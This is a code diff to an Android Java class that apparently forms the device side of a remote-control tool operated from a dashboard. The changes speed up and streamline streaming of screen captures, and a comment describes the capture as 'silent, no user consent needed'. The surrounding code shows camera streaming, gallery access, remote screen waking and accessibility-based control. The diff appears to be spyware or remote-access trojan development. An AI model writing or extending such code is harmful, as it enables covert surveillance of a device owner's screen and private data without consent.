@@ -143,6 +143,8 @@ public class SocketManager {
     // ── Wake keep-alive loop — device wakes screen every 10 s until timed out ──
     private volatile ScheduledFuture<?> wakeKeepAliveFuture;
     private volatile long wakeKeepAliveLastTrigger = 0L;
+    // Rate-limit for the "no capture method available" warning — log at most once per 30s.
+    private volatile long captureUnavailableLastLogMs = 0L;
     private static final long WAKE_KEEP_ALIVE_INTERVAL_MS = 10_000L;
     private static final long WAKE_KEEP_ALIVE_TIMEOUT_MS  = 4 * 60_000L; // auto-stop after 4 min
 
@@ -1655,18 +1657,24 @@ public class SocketManager {
             // Read the interval the dashboard requests (500-5000ms; default 2000ms).
             // Mirrors how screen_reader_stream_start reads intervalMs — same pattern.
             final long requestedIntervalMs = Math.max(500L, params.optLong("intervalMs", 2000L));
-            // Serialize through heartbeatExecutor (single-threaded) so that a
-            // stream_stop submitted just before this cannot arrive *after* we
-            // start — guaranteeing FIFO order between stop and start commands.
             final String deviceId = DeviceInfo.getDeviceId(context);
+            // Serialize setup through heartbeatExecutor (single-threaded) so that a
+            // stream_stop submitted just before this cannot arrive *after* we start.
             heartbeatExecutor.execute(() -> {
                 // Feature mutex: stop camera stream and gallery before starting screen stream
                 if (cameraStreamHandler.isStreaming()) cameraStreamHandler.stopStream();
                 galleryStopFlag.set(true);
                 activeFeature = "screen";
                 startIdleFrameMode(deviceId, requestedIntervalMs);
-                sendSingleFrame(deviceId);
+                // Do NOT call sendSingleFrame here — first frame is already in-flight
+                // on the capture executor (dispatched below, before this task was queued).
             });
+            // Dispatch the first frame capture directly to the capture executor RIGHT NOW —
+            // do not wait for heartbeatExecutor to dequeue the setup lambda above.
+            // This eliminates the "setup queue" delay so the first screenshot starts
+            // arriving within one captureScreenSync() call (~100-500ms) instead of
+            // waiting for heartbeatExecutor + captureScreenSync() in sequence.
+            sendSingleFrame(deviceId);
             JSONObject r = new JSONObject();
             r.put("success", true);
             r.put("message", "Stream started — push interval " + requestedIntervalMs + "ms");
@@ -2037,28 +2045,34 @@ public class SocketManager {
     }
 
     private Bitmap captureFrame() {
-        final Bitmap[] result = {null};
-
-        Runnable doCapture = () -> {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
-                if (svc != null) {
-                    result[0] = svc.captureScreenSync();
-                    return;
+        // AccessibilityService.takeScreenshot() — API 30+, silent, no user consent needed.
+        // Screenshot capture and gesture control are independent — the stream continues
+        // sending frames even when the user has not enabled accessibility for UI control.
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+            if (svc != null) {
+                Bitmap bmp = svc.captureScreenSync();
+                if (bmp != null) return bmp;
+                // captureScreenSync() returned null (service initialising or transient error).
+                // Fall through — loop will retry on next tick.
+            } else {
+                // Accessibility service not running: log once every 30 s to avoid spam.
+                long now = System.currentTimeMillis();
+                if (now - captureUnavailableLastLogMs > 30_000L) {
+                    captureUnavailableLastLogMs = now;
+                    Log.w(TAG, "captureFrame: accessibility service not running — stream loop is alive but frames are suppressed until the service starts.");
                 }
             }
-            try {
-                result[0] = screenshotHandler.captureBitmap();
-            } catch (Exception e) {
-                Log.w(TAG, "captureFrame fallback failed: " + e.getMessage());
+        } else {
+            // API < 30: AccessibilityService.takeScreenshot() is unavailable.
+            // Stream loop stays alive; frames resume if device is running API 30+.
+            long now = System.currentTimeMillis();
+            if (now - captureUnavailableLastLogMs > 30_000L) {
+                captureUnavailableLastLogMs = now;
+                Log.w(TAG, "captureFrame: API " + Build.VERSION.SDK_INT + " < 30 — takeScreenshot() unavailable, stream idle.");
             }
-        };
-
-        // captureScreenSync() uses AccessibilityService.takeScreenshot() which captures
-        // the real screen content behind accessibility overlays — no need to hide the overlay.
-        doCapture.run();
-
-        return result[0];
+        }
+        return null;
     }
 
     private String bitmapToBase64(Bitmap bitmap, int quality) {
